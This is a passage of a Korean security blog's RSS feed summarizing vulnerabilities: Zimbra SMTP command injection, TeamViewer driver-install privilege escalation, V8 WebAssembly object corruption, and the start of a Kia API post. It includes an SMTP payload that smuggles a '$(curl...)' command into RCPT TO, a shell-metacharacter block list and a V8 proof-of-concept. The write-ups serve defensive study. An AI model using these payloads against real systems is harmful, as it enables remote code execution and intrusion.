&#xB77C;&#xC778;)&#xB85C; &#xC0DD;&#xC131;&#xD569;&#xB2C8;&#xB2E4;.</p><pre><code class="hljs subunit">EHLO localhostMAIL FROM: &lt;aaaa@mail.domain.com&gt;RCPT TO: &lt;&quot;aabbb$(curl${IFS}/tmp/pwn)&quot;@mail.domain.com&gt;DATA<span class="hljs-keyword">Test </span>message.</code></pre><p>&#xC774;&#xB54C; &#xC785;&#xB825;&#xAC12;&#xC5D0; &#xB300;&#xD55C; &#xAC80;&#xC99D;&#xC774; &#xC874;&#xC7AC;&#xD558;&#xC9C0; &#xC54A;&#xAE30; &#xB54C;&#xBB38;&#xC5D0; &#xC704;&#xC640; &#xAC19;&#xC740; SMTP &#xBA54;&#xC2DC;&#xC9C0;&#xB97C; &#xC804;&#xC1A1;&#xD574;&#xC11C; &#xC784;&#xC758;&#xC758; command&#xB97C; &#xC0BD;&#xC785;&#xD558;&#xB294; &#xAC83;&#xC774; &#xAC00;&#xB2A5;&#xD558;&#xACE0; &#xADF8; &#xACB0;&#xACFC; &#xC544;&#xB798;&#xC640; &#xAC19;&#xC774; <code>popen</code> &#xC758; &#xC778;&#xC790;&#xB85C; <code>RCPT TO</code> &#xC5D0; &#xC0BD;&#xC785;&#xB41C; command&#xAC00; &#xC0AC;&#xC6A9;&#xB418;&#xB294; &#xAC83;&#xC744; &#xBCFC; &#xC218; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;.</p><p><img src="/2024/10/09/pwndorei/2024-10-09/image%201.png" alt="image.png"></p><p>&#xC704; &#xC2A4;&#xD06C;&#xB9B0;&#xC0F7;&#xC5D0;&#xC11C; &#xD655;&#xC778;&#xD560; &#xC218; &#xC788;&#xB294; &#xAC83;&#xCC98;&#xB7FC; <code>RCPT TO</code>&#xC758; &#xB370;&#xC774;&#xD130;&#xAC00; <code>popen</code>&#xC758; &#xC778;&#xC790;&#xC5D0; &#xD3EC;&#xD568;&#xB418;&#xC5B4; &#xC788;&#xACE0;  <code>\&quot;</code>&#xB85C; &#xAC10;&#xC2F8;&#xC838; &#xC788;&#xAE30; &#xB54C;&#xBB38;&#xC5D0; &#xC0BD;&#xC785;&#xB41C; command&#xB97C; &#xC2E4;&#xD589;&#xD558;&#xAE30; &#xC704;&#xD574; <code>$()</code>&#xAC00; &#xC0AC;&#xC6A9;&#xB418;&#xC5C8;&#xC2B5;&#xB2C8;&#xB2E4;.</p><p>&#xD574;&#xB2F9; &#xCDE8;&#xC57D;&#xC810;&#xC758; &#xD328;&#xCE58;&#xB294; &#xC544;&#xB798;&#xC758; <code>is_safe_input</code> &#xD568;&#xC218;&#xB97C; &#xD638;&#xCD9C;&#xD574;&#xC11C; &#xC0AC;&#xC6A9;&#xC790;&#xC758; &#xC785;&#xB825;&#xC744; &#xAC80;&#xC0AC;&#xD558;&#xACE0; &#xC774;&#xD6C4; <code>execvp</code>&#xB97C; &#xD638;&#xCD9C;&#xD574;&#xC11C; &#xD504;&#xB85C;&#xC138;&#xC2A4;&#xB97C; &#xC0DD;&#xC131;&#xD558;&#xB294; &#xBC29;&#xC2DD;&#xC73C;&#xB85C; &#xC774;&#xB8E8;&#xC5B4;&#xC84C;&#xC2B5;&#xB2C8;&#xB2E4;.</p><pre><code class="hljs c"><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">is_safe_input</span><span class="hljs-params">(<span class="hljs-keyword">char</span> *input)</span> </span>{    <span class="hljs-keyword">if</span> (input == <span class="hljs-literal">NULL</span> || *input == <span class="hljs-string">&apos;\0&apos;</span>) {        <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;    }    <span class="hljs-keyword">for</span> (<span class="hljs-keyword">char</span> *c = input; *c != <span class="hljs-string">&apos;\0&apos;</span>; c++) {        <span class="hljs-keyword">if</span> (*c == <span class="hljs-string">&apos;;&apos;</span> || *c == <span class="hljs-string">&apos;&amp;&apos;</span> || *c == <span class="hljs-string">&apos;|&apos;</span> || *c == <span class="hljs-string">&apos;`&apos;</span> || *c == <span class="hljs-string">&apos;$&apos;</span> ||            *c == <span class="hljs-string">&apos;(&apos;</span> || *c == <span class="hljs-string">&apos;)&apos;</span> || *c == <span class="hljs-string">&apos;&lt;&apos;</span> || *c == <span class="hljs-string">&apos;&gt;&apos;</span> || *c == <span class="hljs-string">&apos;\\&apos;</span> ||            *c == <span class="hljs-string">&apos;\&apos;&apos;</span> || *c == <span class="hljs-string">&apos;\&quot;&apos;</span> || *c == <span class="hljs-string">&apos;\n&apos;</span> || *c == <span class="hljs-string">&apos;\r&apos;</span>) {            <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;        }    }    <span class="hljs-keyword">return</span> <span class="hljs-number">1</span>;}</code></pre>]]></content:encoded>
      
      
      <category domain="https://hackyboiz.github.io/categories/1day1line/">1day1line</category>
      
      
      <category domain="https://hackyboiz.github.io/tags/command-injection/">command injection</category>
      
      <category domain="https://hackyboiz.github.io/tags/RCE/">RCE</category>
      
      <category domain="https://hackyboiz.github.io/tags/pwndorei/">pwndorei</category>
      
      <category domain="https://hackyboiz.github.io/tags/Zimbra/">Zimbra</category>
      
      
      <comments>https://hackyboiz.github.io/2024/10/09/pwndorei/2024-10-09/#disqus_thread</comments>
      
    </item>
    
    <item>
      <title>[하루한줄] CVE-2024-7479, CVE-2024-7481: TeamViewer Elevation of Privilege 취약점</title>
      <link>https://hackyboiz.github.io/2024/10/05/l0ch/2024-10-05/</link>
      <guid>https://hackyboiz.github.io/2024/10/05/l0ch/2024-10-05/</guid>
      <pubDate>Sat, 05 Oct 2024 08:00:00 GMT</pubDate>
      
        
        
      <description>&lt;h2 id=&quot;URL&quot;&gt;&lt;a href=&quot;#URL&quot; class=&quot;headerlink&quot; title=&quot;URL&quot;&gt;&lt;/a&gt;URL&lt;/h2&gt;&lt;p&gt;&lt;a href=&quot;https://github.com/PeterGabaldon/CVE-2024-7479_CVE-2024-7</description>
        
      
      
      
      <content:encoded><![CDATA[<h2 id="URL"><a href="#URL" class="headerlink" title="URL"></a>URL</h2><p><a href="https://github.com/PeterGabaldon/CVE-2024-7479_CVE-2024-7481">https://github.com/PeterGabaldon/CVE-2024-7479_CVE-2024-7481</a></p><h2 id="Target"><a href="#Target" class="headerlink" title="Target"></a>Target</h2><ul><li>affected from <strong>15.0.0</strong> before <strong>15.58.4</strong></li><li>affected from <strong>14.0.0</strong> before <strong>14.7.48796</strong></li><li>affected from <strong>13.0.0</strong> before <strong>13.2.36225</strong></li><li>affected from <strong>12.0.0</strong> before <strong>12.0.259312</strong></li><li>affected from <strong>11.0.0</strong> before <strong>11.0.259311</strong></li></ul><h2 id="Explain"><a href="#Explain" class="headerlink" title="Explain"></a>Explain</h2><p>TeamViewer&#xB294; Windows, MacOS, Linux, iOS, &#xC548;&#xB4DC;&#xB85C;&#xC774;&#xB4DC; &#xB4F1; &#xB300;&#xBD80;&#xBD84;&#xC758; &#xD50C;&#xB7AB;&#xD3FC;&#xC744; &#xC9C0;&#xC6D0;&#xD558;&#xB294; &#xC6D0;&#xACA9; &#xC81C;&#xC5B4; &#xC18C;&#xD504;&#xD2B8;&#xC6E8;&#xC5B4;&#xB85C;, &#xC804; &#xC138;&#xACC4;&#xC758; &#xB9CE;&#xC740; &#xAE30;&#xC5C5; &#xBC0F; &#xAC1C;&#xC778;&#xC774; &#xC0AC;&#xC6A9;&#xD558;&#xB294; &#xC778;&#xAE30;&#xC788;&#xB294; &#xC18C;&#xD504;&#xD2B8;&#xC6E8;&#xC5B4;&#xC785;&#xB2C8;&#xB2E4;.</p><p>Windows &#xD50C;&#xB7AB;&#xD3FC;&#xC758; TeamViewer&#xC5D0;&#xC11C; &#xBC1C;&#xACAC;&#xB41C; &#xAD8C;&#xD55C; &#xC0C1;&#xC2B9;&#xC774; &#xAC00;&#xB2A5;&#xD55C; &#xCDE8;&#xC57D;&#xC810; CVE-2024-4749, CVE-2024-7481&#xC758; &#xC138;&#xBD80; &#xC815;&#xBCF4;&#xAC00; &#xACF5;&#xAC1C;&#xB418;&#xC5C8;&#xC2B5;&#xB2C8;&#xB2E4;.</p><p>&#xB450; &#xCDE8;&#xC57D;&#xC810; &#xBAA8;&#xB450; TeamViewer&#xC758; &#xC7A5;&#xCE58; &#xB4DC;&#xB77C;&#xC774;&#xBC84; &#xC124;&#xCE58; &#xAE30;&#xB2A5;&#xC5D0;&#xC11C; &#xBC1C;&#xC0DD;&#xD569;&#xB2C8;&#xB2E4;. TeamViewer &#xD074;&#xB77C;&#xC774;&#xC5B8;&#xD2B8;&#xC5D0;&#xB294; VPN/&#xD504;&#xB9B0;&#xD130; &#xC7A5;&#xCE58; &#xB4DC;&#xB77C;&#xC774;&#xBC84;&#xB97C; &#xC124;&#xCE58;&#xD560; &#xC218; &#xC788;&#xB294; &#xAE30;&#xB2A5;&#xC774; &#xC874;&#xC7AC;&#xD569;&#xB2C8;&#xB2E4;. &#xC124;&#xCE58;&#xB418;&#xB294; &#xC7A5;&#xCE58; &#xB4DC;&#xB77C;&#xC774;&#xBC84;&#xC758; IPC &#xBA54;&#xC11C;&#xB4DC; ID&#xC5D0; &#xB530;&#xB77C; CVE&#xAC00; &#xD560;&#xB2F9;&#xB418;&#xC5C8;&#xC73C;&#xBA70;, VPN &#xB4DC;&#xB77C;&#xC774;&#xBC84;&#xB294; &#xC124;&#xCE58; &#xAE30;&#xB2A5;&#xC5D0;&#xB294; CVE-2024-7479&#xAC00;, &#xD504;&#xB9B0;&#xD130; &#xB4DC;&#xB77C;&#xC774;&#xBC84; &#xC124;&#xCE58; &#xAE30;&#xB2A5;&#xC5D0;&#xB294; CVE-2024-7481&#xC774; &#xAC01;&#xAC01; &#xD560;&#xB2F9;&#xB418;&#xC5C8;&#xC2B5;&#xB2C8;&#xB2E4;.</p><p><img src="/2024/10/05/l0ch/2024-10-05/image01.png" alt></p><blockquote><p>&#xCD9C;&#xCC98;: <a href="https://pgj11.com/posts/Finding-TeamViewer-0days-Part-1/">https://pgj11.com/posts/Finding-TeamViewer-0days-Part-1/</a></p></blockquote><p>&#xB4DC;&#xB77C;&#xC774;&#xBC84; &#xC124;&#xCE58; &#xAD8C;&#xD55C;&#xC774; &#xC5C6;&#xB294; TeamViewer &#xD074;&#xB77C;&#xC774;&#xC5B8;&#xD2B8;&#xB294; 5939/tcp &#xC18C;&#xCF13;&#xC5D0; &#xBC14;&#xC778;&#xB529;&#xB41C; IPC&#xB97C; &#xD1B5;&#xD574; SYSTEM &#xACC4;&#xC815;&#xC73C;&#xB85C; &#xC2E4;&#xD589;&#xB418;&#xB294;  <code>TeamViewer_service.exe</code> &#xC11C;&#xBE44;&#xC2A4; &#xD504;&#xB85C;&#xC138;&#xC2A4;&#xC5D0; &#xB4DC;&#xB77C;&#xC774;&#xBC84; &#xC124;&#xCE58; &#xC694;&#xCCAD;&#xC744; &#xBCF4;&#xB0C5;&#xB2C8;&#xB2E4;.<code>TeamViewer_service.exe</code>&#xB294; &#xD074;&#xB77C;&#xC774;&#xC5B8;&#xD2B8;&#xC5D0;&#xAC8C; &#xC804;&#xB2EC;&#xBC1B;&#xC740; &#xB9E4;&#xAC1C;&#xBCC0;&#xC218;&#xC640; &#xD568;&#xAED8; <code>tv_x64.exe</code> &#xB97C; &#xC2E4;&#xD589;&#xD574; &#xB4DC;&#xB77C;&#xC774;&#xBC84;&#xB97C; &#xC124;&#xCE58;&#xD558;&#xACE0; &#xCEE4;&#xB110;&#xC5D0; &#xB85C;&#xB4DC;&#xD569;&#xB2C8;&#xB2E4;. &#xB2E4;&#xC74C;&#xC740; VPN &#xC7A5;&#xCE58; &#xB4DC;&#xB77C;&#xC774;&#xBC84;&#xB97C; &#xC124;&#xCE58;&#xD560; &#xB54C; <code>tv_x64.exe</code>&#xB85C; &#xC804;&#xB2EC;&#xB418;&#xB294; &#xB9E4;&#xAC1C;&#xBCC0;&#xC218;&#xC785;&#xB2C8;&#xB2E4;.</p><pre><code class="hljs powershell"><span class="hljs-string">&quot;C:\Program Files\TeamViewer\tv_x64.exe&quot;</span> -<span class="hljs-literal">-action</span> install -<span class="hljs-literal">-verbose</span> -<span class="hljs-literal">-log</span> C:\Program Files\TeamViewer\TeamViewer15_Logfile.log  -<span class="hljs-literal">-event</span> Local\DriverInstallFinishEvent_VPN -<span class="hljs-literal">-inf</span> C:\Program Files\TeamViewer\x64\TeamViewerVPN.inf -<span class="hljs-literal">-id</span> TEAMVIEWERVPN</code></pre><p>&#xC774; &#xACFC;&#xC815;&#xC5D0;&#xC11C; &#xD074;&#xB77C;&#xC774;&#xC5B8;&#xD2B8;&#xC758; &#xB4DC;&#xB77C;&#xC774;&#xBC84; &#xC124;&#xCE58; &#xC694;&#xCCAD; &#xB9E4;&#xAC1C;&#xBCC0;&#xC218;&#xB97C; &#xD544;&#xD130;&#xB9C1;&#xD558;&#xC9C0; &#xC54A;&#xC544; &#xACF5;&#xACA9;&#xC790;&#xB294; &#xC784;&#xC758;&#xC758; &#xB4DC;&#xB77C;&#xC774;&#xBC84; &#xD328;&#xD0A4;&#xC9C0; &#xC815;&#xBCF4;&#xAC00; &#xD3EC;&#xD568;&#xB41C; INF &#xACBD;&#xB85C;&#xB97C; &#xC804;&#xB2EC;&#xD560; &#xC218; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;. TeamViewer &#xC11C;&#xBE44;&#xC2A4;&#xB294; &#xC720;&#xD6A8;&#xD558;&#xC9C0; &#xC54A;&#xC740; &#xD074;&#xB77C;&#xC774;&#xC5B8;&#xD2B8; &#xC694;&#xCCAD;&#xC744; &#xBC29;&#xC9C0;&#xD558;&#xAE30; &#xC704;&#xD574; &#xC694;&#xCCAD;&#xC5D0; &#xB300;&#xD574; MD5 &#xD574;&#xC2DC;&#xB97C; &#xC774;&#xC6A9;&#xD55C; &#xC778;&#xC99D; &#xCC4C;&#xB9B0;&#xC9C0;&#xAC00; &#xC874;&#xC7AC;&#xD558;&#xC9C0;&#xB9CC; &#xC57D;&#xD55C; &#xC778;&#xC99D; &#xC218;&#xC900;&#xC73C;&#xB85C; &#xC778;&#xD574; &#xC778;&#xC99D; &#xACFC;&#xC815;&#xC744; &#xC815;&#xC0C1;&#xC801;&#xC73C;&#xB85C; &#xC218;&#xD589;&#xD558;&#xACE0; &#xC784;&#xC758;&#xC758; &#xC694;&#xCCAD;&#xC744; &#xBCF4;&#xB0BC; &#xC218; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;.</p><p>&#xB530;&#xB77C;&#xC11C; TeamViewer &#xD074;&#xB77C;&#xC774;&#xC5B8;&#xD2B8;&#xB97C; &#xC2A4;&#xD478;&#xD551;&#xD558;&#xACE0; &#xACF5;&#xACA9;&#xC790;&#xAC00; &#xC784;&#xC758;&#xC758; INF &#xB4DC;&#xB77C;&#xC774;&#xBC84; &#xC124;&#xC815; &#xD30C;&#xC77C;&#xC744; &#xB9E4;&#xAC1C;&#xBCC0;&#xC218;&#xB85C; &#xC804;&#xB2EC;&#xD558;&#xBA74; &#xC784;&#xC758;&#xC758; &#xB4DC;&#xB77C;&#xC774;&#xBC84;&#xB97C; &#xD0C0;&#xAC9F; &#xC2DC;&#xC2A4;&#xD15C;&#xC5D0; &#xC124;&#xCE58;&#xD560; &#xC218; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;. &#xC774;&#xB97C; &#xC774;&#xC6A9;&#xD558;&#xBA74; &#xCDE8;&#xC57D;&#xD55C; &#xB4DC;&#xB77C;&#xC774;&#xBC84;&#xB97C; &#xC124;&#xCE58;&#xD558;&#xB294; BYOVD &#xAE30;&#xBC95;&#xC744; &#xD1B5;&#xD574; &#xC2DC;&#xC2A4;&#xD15C; &#xAD8C;&#xD55C;&#xC73C;&#xB85C; &#xAD8C;&#xD55C; &#xC0C1;&#xC2B9;&#xC774; &#xAC00;&#xB2A5;&#xD569;&#xB2C8;&#xB2E4;.</p><blockquote><p><strong>BYOVD(Bring Your Own Vulnerable Driver)</strong><br>&#xC54C;&#xB824;&#xC9C4; 1-day &#xCDE8;&#xC57D;&#xC810;&#xC774; &#xC874;&#xC7AC;&#xD558;&#xB294; &#xB514;&#xBC14;&#xC774;&#xC2A4; &#xB4DC;&#xB77C;&#xC774;&#xBC84;&#xB85C;, &#xC815;&#xC0C1;&#xC801;&#xC778; MS &#xC11C;&#xBA85;&#xC774; &#xC788;&#xC5B4; <a href="https://learn.microsoft.com/en-us/windows-hardware/drivers/install/kernel-mode-code-signing-policy--windows-vista-and-later-">&#xB4DC;&#xB77C;&#xC774;&#xBC84; &#xC11C;&#xBA85;</a> &#xC815;&#xCC45;&#xC744; &#xC6B0;&#xD68C;&#xD558;&#xACE0; &#xC2DC;&#xC2A4;&#xD15C;&#xC5D0; &#xC124;&#xCE58; &#xAC00;&#xB2A5;&#xD55C; &#xB4DC;&#xB77C;&#xC774;&#xBC84;&#xC784;.<br>&#xAD00;&#xB9AC;&#xC790; &#xC218;&#xC900;&#xC758; &#xCF54;&#xB4DC; &#xC2E4;&#xD589;&#xC774; &#xAC00;&#xB2A5;&#xD55C; &#xACF5;&#xACA9;&#xC790;&#xAC00; &#xCEE4;&#xB110; &#xAD8C;&#xD55C;&#xC744; &#xD68D;&#xB4DD;&#xD558;&#xAE30; &#xC704;&#xD574; &#xB110;&#xB9AC; &#xC0AC;&#xC6A9;&#xB418;&#xB294; &#xAE30;&#xBC95;&#xC784;.</p></blockquote><h2 id="Reference"><a href="#Reference" class="headerlink" title="Reference"></a>Reference</h2><p><a href="https://pgj11.com/posts/Finding-TeamViewer-0days-Part-1/">https://pgj11.com/posts/Finding-TeamViewer-0days-Part-1/</a></p><p><a href="https://pgj11.com/posts/Finding-TeamViewer-0days-Part-2/">https://pgj11.com/posts/Finding-TeamViewer-0days-Part-2/</a></p><p><a href="https://pgj11.com/posts/Finding-TeamViewer-0days-Part-3/">https://pgj11.com/posts/Finding-TeamViewer-0days-Part-3/</a></p>]]></content:encoded>
      
      
      <category domain="https://hackyboiz.github.io/categories/1day1line/">1day1line</category>
      
      
      <category domain="https://hackyboiz.github.io/tags/L0ch/">L0ch</category>
      
      <category domain="https://hackyboiz.github.io/tags/TeamViewer/">TeamViewer</category>
      
      <category domain="https://hackyboiz.github.io/tags/Windows/">Windows</category>
      
      <category domain="https://hackyboiz.github.io/tags/EoP/">EoP</category>
      
      <category domain="https://hackyboiz.github.io/tags/BYOVD/">BYOVD</category>
      
      
      <comments>https://hackyboiz.github.io/2024/10/05/l0ch/2024-10-05/#disqus_thread</comments>
      
    </item>
    
    <item>
      <title>[하루한줄] CVE-2024-3832: V8 엔진에서 발생하는 Object Corruption 취약점</title>
      <link>https://hackyboiz.github.io/2024/10/02/ogu123/cve-2024-3832/</link>
      <guid>https://hackyboiz.github.io/2024/10/02/ogu123/cve-2024-3832/</guid>
      <pubDate>Wed, 02 Oct 2024 08:00:00 GMT</pubDate>
      
        
        
      <description>&lt;h2 id=&quot;URL&quot;&gt;&lt;a href=&quot;#URL&quot; class=&quot;headerlink&quot; title=&quot;URL&quot;&gt;&lt;/a&gt;URL&lt;/h2&gt;&lt;p&gt;&lt;a href=&quot;https://securitylab.github.com/advisories/GHSL-2024-071_C</description>
        
      
      
      
      <content:encoded><![CDATA[<h2 id="URL"><a href="#URL" class="headerlink" title="URL"></a>URL</h2><p><a href="https://securitylab.github.com/advisories/GHSL-2024-071_Chromium/">https://securitylab.github.com/advisories/GHSL-2024-071_Chromium/</a></p><h2 id="Target"><a href="#Target" class="headerlink" title="Target"></a>Target</h2><ul><li>Chrome &lt; 124.0.6367.60</li></ul><h2 id="Explain"><a href="#Explain" class="headerlink" title="Explain"></a>Explain</h2><p>CVE-2024-3832&#xB294; Chrome V8 &#xC5D4;&#xC9C4;&#xC5D0;&#xC11C; &#xBC1C;&#xC0DD;&#xD558;&#xB294; &#xCDE8;&#xC57D;&#xC810;&#xC73C;&#xB85C; WebAssembly &#xAC1D;&#xCCB4;&#xC5D0; &#xD2B9;&#xC815; &#xC18D;&#xC131;&#xC744; &#xCD94;&#xAC00;&#xD558;&#xB294; &#xACFC;&#xC815;&#xC5D0;&#xC11C; &#xC11C;&#xB85C; &#xB2E4;&#xB978; &#xAC1D;&#xCCB4;&#xB97C; &#xCC38;&#xC870;&#xD574; Object Corruption&#xC774; &#xBC1C;&#xC0DD;&#xD588;&#xC2B5;&#xB2C8;&#xB2E4;.</p><pre><code class="hljs lasso"><span class="hljs-literal">void</span> WasmJs<span class="hljs-type">::InstallConditionalFeatures</span>(Isolate* isolate,                                        <span class="hljs-keyword">Handle</span>&lt;NativeContext&gt; context) {  <span class="hljs-params">...</span>  MaybeHandle&lt;Object&gt; maybe_wasm =      JSReceiver<span class="hljs-type">::GetProperty</span>(isolate, <span class="hljs-built_in">global</span>, <span class="hljs-string">&quot;WebAssembly&quot;</span>);    <span class="hljs-comment">//&lt;-------- 1.</span>  <span class="hljs-params">...</span>  <span class="hljs-keyword">if</span> (isolate-&gt;IsWasmJSPIEnabled(context)) {    isolate-&gt;WasmInitJSPIFeature();    <span class="hljs-keyword">Handle</span>&lt;<span class="hljs-built_in">String</span>&gt; suspender_string = v8_str(isolate, <span class="hljs-string">&quot;Suspender&quot;</span>);    <span class="hljs-keyword">if</span> (!JSObject<span class="hljs-type">::HasRealNamedProperty</span>(isolate, webassembly, suspender_string)   <span class="hljs-comment">//&lt;----- 2.</span>             .FromMaybe(<span class="hljs-literal">true</span>)) {      InstallSuspenderConstructor(isolate, context);    }    <span class="hljs-comment">// Install Wasm type reflection features (if not already done).</span>    <span class="hljs-keyword">Handle</span>&lt;<span class="hljs-built_in">String</span>&gt; function_string = v8_str(isolate, <span class="hljs-string">&quot;Function&quot;</span>);    <span class="hljs-keyword">if</span> (!JSObject<span class="hljs-type">::HasRealNamedProperty</span>(isolate, webassembly, function_string)             .FromMaybe(<span class="hljs-literal">true</span>)) {      InstallTypeReflection(isolate, context);    }  }}</code></pre><p><code>InstallConditionalFeatures</code> &#xD568;&#xC218;&#xB294; global WebAssembly &#xAC1D;&#xCCB4;&#xC5D0; <code>Suspender</code>&#xC640; <code>Function</code>&#xC18D;&#xC131;&#xC744; &#xCD94;&#xAC00;&#xD558;&#xAE30; &#xC804;, &#xD574;&#xB2F9; &#xC18D;&#xC131;&#xC774; &#xC774;&#xBBF8; &#xC874;&#xC7AC;&#xD558;&#xB294;&#xC9C0; &#xD655;&#xC778;&#xD569;&#xB2C8;&#xB2E4;.<br>&#xB9CC;&#xC57D; <code>Suspender</code> &#xC18D;&#xC131;&#xC774; &#xC5C6;&#xC73C;&#xBA74;, <code>InstallSuspenderConstructor</code> &#xD568;&#xC218;&#xB97C; &#xD638;&#xCD9C;&#xD574;&#xC11C; &#xC18D;&#xC131;&#xC744; &#xCD94;&#xAC00;&#xD569;&#xB2C8;&#xB2E4;.</p><pre><code class="hljs mipsasm">void WasmJs::<span class="hljs-keyword">InstallSuspenderConstructor(Isolate* </span>isolate,                                         Handle&lt;NativeContext&gt; <span class="hljs-built_in">context</span>) {  Handle&lt;<span class="hljs-keyword">JSObject&gt; </span>webassembly(<span class="hljs-built_in">context</span>-&gt;wasm_webassembly_object(), isolate)<span class="hljs-comment">;    //&lt;------ 3.</span>  Handle&lt;<span class="hljs-keyword">JSFunction&gt; </span>suspender_constructor = <span class="hljs-keyword">InstallConstructorFunc(</span><span class="hljs-keyword"> </span>     isolate, webassembly, <span class="hljs-string">&quot;Suspender&quot;</span>, WebAssemblySuspender);  <span class="hljs-built_in">context</span>-&gt;set_wasm_suspender_constructor(*suspender_constructor);  SetupConstructor(isolate, suspender_constructor, WASM_SUSPENDER_OBJECT_TYPE,<span class="hljs-symbol">                   WasmSuspenderObject:</span>:kHeaderSize, <span class="hljs-string">&quot;WebAssembly.Suspender&quot;</span>);}</code></pre><p><code>InstallSuspenderConstructor</code> &#xD568;&#xC218; &#xB0B4;&#xC5D0;&#xC11C; 3&#xBC88; &#xCF54;&#xB4DC;&#xB97C; &#xD655;&#xC778;&#xD558;&#xBA74;, <code>context-&gt;wasm_webassembly_object()</code>&#xB97C; &#xC0AC;&#xC6A9;&#xD574; WebAssembly &#xAC1D;&#xCCB4;&#xB97C; &#xCC38;&#xC870;&#xD569;&#xB2C8;&#xB2E4;.</p><p>&#xBB38;&#xC81C;&#xB294; &#xD574;&#xB2F9; &#xAC1D;&#xCCB4;&#xAC00; global WebAssembly &#xAC1D;&#xCCB4;&#xC640; &#xB2E4;&#xB97C; &#xC218; &#xC788;&#xC5B4; &#xB3D9;&#xC77C;&#xD55C; <code>Suspender</code> &#xC18D;&#xC131;&#xC774; &#xB450; &#xBC88; &#xCD94;&#xAC00;&#xB418;&#xC5B4; Object Corruption&#xC73C;&#xB85C; &#xC774;&#xC5B4;&#xC9C8; &#xC218; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;.</p><pre><code class="hljs abnf">WebAssembly.foo = <span class="hljs-number">1</span><span class="hljs-comment">;</span>delete WebAssembly.foo<span class="hljs-comment">;</span>WebAssembly.Suspender = <span class="hljs-number">1</span><span class="hljs-comment">;</span>let x = WebAssembly<span class="hljs-comment">;</span><span class="hljs-attribute">WebAssembly</span> = {}<span class="hljs-comment">;</span>d8.test.enableJSPI()<span class="hljs-comment">;</span>de.test.installConditionalFeatures()<span class="hljs-comment">;</span>%DebugPrint(x)<span class="hljs-comment">;</span>%SystemBreak()<span class="hljs-comment">;</span></code></pre><p>&#xC704; PoC &#xCF54;&#xB4DC;&#xB97C; &#xC0AC;&#xC6A9;&#xD560; &#xACBD;&#xC6B0; Object Corruption&#xC744; &#xD2B8;&#xB9AC;&#xAC70; &#xD560; &#xC218; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;.</p><p><code>WebAssembly</code> &#xAC1D;&#xCCB4;&#xC5D0; <code>Suspender</code> &#xC18D;&#xC131;&#xC744; &#xCD94;&#xAC00;&#xD558;&#xACE0;, &#xD574;&#xB2F9; &#xAC1D;&#xCCB4;&#xB97C; &#xBCC0;&#xC218; <code>x</code> &#xC5D0; &#xC800;&#xC7A5;&#xD569;&#xB2C8;&#xB2E4;.</p><p>&#xC774;&#xD6C4;, &#xC0C8;&#xB85C; &#xC815;&#xC758;&#xB41C; &#xBE48; <code>WebAssembly</code> &#xAC1D;&#xCCB4; &#xC0DD;&#xC131; &#xD6C4; <code>installConditionalFeatures</code> &#xD568;&#xC218;&#xB97C; &#xC2E4;&#xD589;&#xD558;&#xBA74;, &#xBE48; <code>WebAssembly</code> &#xAC1D;&#xCCB4;&#xC5D0; &#xB300;&#xD574; &#xC18D;&#xC131; &#xAC80;&#xC0AC;&#xB97C; &#xC218;&#xD589;&#xD558;&#xC9C0;&#xB9CC;, &#xC2E4;&#xC81C; &#xC18D;&#xC131; &#xCD94;&#xAC00;&#xB294; &#xBCC0;&#xC218; <code>x</code> &#xAC1D;&#xCCB4;&#xC5D0; &#xCD94;&#xAC00;&#xD558;&#xAE30; &#xB54C;&#xBB38;&#xC5D0; Object Corruption&#xC774; &#xD2B8;&#xB9AC;&#xAC70; &#xB429;&#xB2C8;&#xB2E4;.</p>]]></content:encoded>
      
      
      <category domain="https://hackyboiz.github.io/categories/1day1line/">1day1line</category>
      
      
      <category domain="https://hackyboiz.github.io/tags/ogu123/">ogu123</category>
      
      <category domain="https://hackyboiz.github.io/tags/V8/">V8</category>
      
      <category domain="https://hackyboiz.github.io/tags/Object-Corruption/">Object Corruption</category>
      
      
      <comments>https://hackyboiz.github.io/2024/10/02/ogu123/cve-2024-3832/#disqus_thread</comments>
      
    </item>
    
    <item>
      <title>[하루한줄] 기아 차량 원격 제어 취약점</title>
      <link>https://hackyboiz.github.io/2024/10/01/h4mG/kia/</link>
      <guid>https://hackyboiz.github.io/2024/10/01/h4mG/kia/</guid>
      <pubDate>Tue, 01 Oct 2024 09:00:00 GMT</pubDate>
      
        
        
      <description>&lt;h2 id=&quot;URL&quot;&gt;&lt;a href=&quot;#URL&quot; class=&quot;headerlink&quot; title=&quot;URL&quot;&gt;&lt;/a&gt;URL&lt;/h2&gt;&lt;p&gt;&lt;a href=&quot;https://samcurry.net/hacking-kia&quot;&gt;https://samcurry.net/ha</description>
        
      
      
      
      <content:encoded><![CDATA[<h2 id="URL"><a href="#URL" class="headerlink" title="URL"></a>URL</h2><p><a href="https://samcurry.net/hacking-kia">https://samcurry.net/hacking-kia</a></p><h2 id="Target"><a href="#Target" class="headerlink" title="Target"></a>Target</h2><ul><li>&#xAE30;&#xC544; &#xB51C;&#xB7EC; &#xC6F9;&#xC0AC;&#xC774;&#xD2B8;(kiaconnect.kdealer.com) API</li></ul><h2 id="Explain"><a href="#Explain" class="headerlink" title="Explain"></a>Explain</h2><p>2024&#xB144; 6&#xC6D4; 11&#xC77C;, &#xAE30;&#xC544; &#xCC28;&#xB7C9;&#xC5D0;&#xC11C; &#xCC28;&#xB7C9; &#xBC88;&#xD638;&#xD310;&#xB9CC;&#xC73C;&#xB85C; &#xC8FC;&#xC694; &#xAE30;&#xB2A5;&#xC744; &#xC6D0;&#xACA9;&#xC73C;&#xB85C; &#xC81C;&#xC5B4;&#xD560; &#xC218; &#xC788;&#xB294; &#xCDE8;&#xC57D;&#xC810;&#xC774; &#xBC1C;&#xACAC;&#xB418;&#xC5C8;&#xC2B5;&#xB2C8;&#xB2E4;. </p><p>&#xCDE8;&#xC57D;&#xC810;&#xC740; &#xCC28;&#xB7C9;&#xC5D0; &#xC7A5;&#xCC29;&#xB41C; &#xD558;&#xB4DC;&#xC6E8;&#xC5B4;&#xB97C; &#xD1B5;&#xD574; &#xC57D; 30&#xCD08; &#xB0B4;&#xC5D0; &#xACF5;&#xACA9;&#xC774; &#xAC00;&#xB2A5;&#xD558;&#xBA70;, 